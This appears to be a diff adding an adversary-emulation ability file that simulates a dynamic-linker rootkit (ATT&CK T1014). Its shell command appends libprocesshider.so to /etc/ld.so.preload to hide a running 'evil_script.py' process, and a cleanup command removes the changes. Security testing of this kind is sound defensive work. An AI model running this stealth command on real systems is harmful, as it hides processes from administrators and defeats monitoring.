@@ -1,0 +1,20 @@
+---
+- id: 1a35d5a1ced99d3e5e764ac6f5ba727f
+  name: dynamic-linker based rootkit (libprocesshider)
+  description: 'Uses libprocesshider to simulate rootkit behavior by hiding a specific
+    process name via ld.so.preload (see also T1574.006).
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1014
+    name: Rootkit
+  platforms:
+    linux:
+      sh:
+        command: echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload;
+          /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py
+          || echo "process hidden"
+        payloads: []
+        cleanup: sed -i "\:^/usr/local/lib/libprocesshider.so:d" /etc/ld.so.preload;
+          rm -rf /usr/local/lib/libprocesshider.so /usr/local/bin/evil_script.py /tmp/atomic
